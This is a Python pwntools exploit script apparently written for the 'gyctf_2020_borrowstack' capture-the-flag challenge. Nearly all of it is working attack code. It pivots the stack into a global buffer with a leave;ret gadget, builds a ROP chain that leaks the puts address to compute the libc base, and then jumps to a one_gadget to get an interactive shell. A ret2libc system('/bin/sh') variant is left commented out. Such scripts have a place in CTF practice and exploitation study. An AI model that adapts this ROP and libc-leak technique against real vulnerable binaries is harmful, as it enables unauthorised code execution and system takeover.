from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh, base)

context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='i386', log_level='debug')
binary = './gyctf_2020_borrowstack'

context.binary = binary
elf = ELF(binary)
# p = remote('node4.buuoj.cn',26849) if argv[1]=='r' else process(binary)
p= gdb.debug(binary,"break *0x400699")
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
# /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./gyctf_2020_borrowstack

#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()

ret_addr = 0x40069A
leave_ret = 0x400699
pop_rdi_ret = 0x400703
bank_addr = elf.sym['bank']
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = b'a'*0x60 + p64(bank_addr) + p64(leave_ret)
p.send(payload)
payload = p64(ret_addr) * 0x1c + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendafter(b'Done!You can check and use your borrow stack now!\n',payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
system_addr,bin_sh_addr, libc_base = ret2libc(puts_addr, 'puts')
log.success('puts_addr ------> ' + hex(puts_addr))
one_gadget = libc_base + 0x4526a

# payload = b'a'*0x60 + p64(0) +p64(one_gadget)
payload = b'a'*0x60 + p64(bank_addr) + p64(leave_ret)
p.send(payload)
# payload = p64(ret_addr) * 0x1c + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)
payload = p64(ret_addr) * 0x1c + p64(one_gadget)
p.sendafter(b'Done!You can check and use your borrow stack now!\n',payload)

p.interactive()